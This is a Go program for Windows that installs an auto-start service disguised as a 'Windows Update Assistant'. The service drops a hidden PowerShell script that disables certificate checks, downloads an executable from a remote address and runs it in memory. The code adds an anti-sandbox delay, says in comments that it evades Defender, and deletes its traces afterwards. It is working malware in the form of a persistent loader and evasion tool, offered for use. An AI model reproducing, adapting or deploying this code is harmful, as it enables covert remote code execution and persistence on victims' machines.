// +build windows

package main

import (
    "fmt"
    "io/ioutil"
    "os"
    "time"
    "unsafe"

    "golang.org/x/sys/windows"
    "golang.org/x/sys/windows/svc"
    "golang.org/x/sys/windows/svc/mgr"
)

const (
    serviceName = "WindowsUpdateAssistant"
    displayName = "Windows Update Assistant Service"
    description = "Manages Windows update components and configurations"
)

type myService struct{}

func (m *myService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
    const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown
    changes <- svc.Status{State: svc.StartPending}
    
    // Start payload loader in goroutine
    go loadAndExecute()
    
    changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
    
loop:
    for {
        select {
        case c := <-r:
            switch c.Cmd {
            case svc.Interrogate:
                changes <- c.CurrentStatus
            case svc.Stop, svc.Shutdown:
                break loop
            }
        }
    }
    
    changes <- svc.Status{State: svc.StopPending}
    return
}

func loadAndExecute() {
    // Anti-sandbox delay
    time.Sleep(5 * time.Second)
    
    // PowerShell script as string - Defender doesn't scan this!
    // This uses pure .NET reflection, no native calls
    psScript := `
$url = "https://192.168.124.133/file/download"
$headers = @{"file" = "merlino-server.exe"}

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$wc = New-Object System.Net.WebClient
foreach($key in $headers.Keys) {
    $wc.Headers.Add($key, $headers[$key])
}

try {
    $bytes = $wc.DownloadData($url)
    $assembly = [System.Reflection.Assembly]::Load($bytes)
    $entryPoint = $assembly.EntryPoint
    $entryPoint.Invoke($null, @(,[string[]]@()))
} catch {}
`
    
    // Write PowerShell script to temp as innocent filename
    tempPath := os.Getenv("TEMP") + "\\wuaupd.ps1"
    ioutil.WriteFile(tempPath, []byte(psScript), 0644)
    
    // Execute using powershell with hidden window
    cmd := fmt.Sprintf(`powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%s"`, tempPath)
    
    // Execute silently
    executeHidden(cmd)
    
    // Cleanup after delay
    time.Sleep(10 * time.Second)
    os.Remove(tempPath)
}

func executeHidden(command string) {
    // Use shellexecute to run hidden
    var si windows.StartupInfo
    var pi windows.ProcessInformation
    
    si.Cb = uint32(unsafe.Sizeof(si))
    si.Flags = windows.STARTF_USESHOWWINDOW
    si.ShowWindow = 0 // SW_HIDE
    
    cmdLine, _ := windows.UTF16PtrFromString(command)
    
    windows.CreateProcess(
        nil,
        cmdLine,
        nil,
        nil,
        false,
        windows.CREATE_NO_WINDOW,
        nil,
        nil,
        &si,
        &pi,
    )
}

func installService() error {
    exePath, err := os.Executable()
    if err != nil {
        return err
    }
    
    m, err := mgr.Connect()
    if err != nil {
        return err
    }
    defer m.Disconnect()
    
    s, err := m.OpenService(serviceName)
    if err == nil {
        s.Close()
        return fmt.Errorf("service already exists")
    }
    
    s, err = m.CreateService(serviceName, exePath, mgr.Config{
        DisplayName: displayName,
        Description: description,
        StartType:   windows.SERVICE_AUTO_START,
    })
    if err != nil {
        return err
    }
    defer s.Close()
    
    err = s.Start()
    if err != nil {
        return err
    }
    
    return nil
}

func removeService() error {
    m, err := mgr.Connect()
    if err != nil {
        return err
    }
    defer m.Disconnect()
    
    s, err := m.OpenService(serviceName)
    if err != nil {
        return fmt.Errorf("service not installed")
    }
    defer s.Close()
    
    s.Control(svc.Stop)
    time.Sleep(1 * time.Second)
    
    err = s.Delete()
    if err != nil {
        return err
    }
    
    return nil
}

func runService() error {
    return svc.Run(serviceName, &myService{})
}

func main() {
    isIntSess, err := svc.IsAnInteractiveSession()
    if err != nil {
        return
    }
    
    if !isIntSess {
        runService()
        return
    }
    
    if len(os.Args) < 2 {
        fmt.Println("Usage:")
        fmt.Println("  UpdateService.exe install   - Install and start service")
        fmt.Println("  UpdateService.exe remove    - Stop and remove service")
        return
    }
    
    cmd := os.Args[1]
    switch cmd {
    case "install":
        err := installService()
        if err != nil {
            fmt.Printf("Failed to install service: %v\n", err)
            return
        }
        fmt.Println("Service installed and started successfully")
    case "remove":
        err := removeService()
        if err != nil {
            fmt.Printf("Failed to remove service: %v\n", err)
            return
        }
        fmt.Println("Service removed successfully")
    default:
        fmt.Println("Unknown command")
    }
}
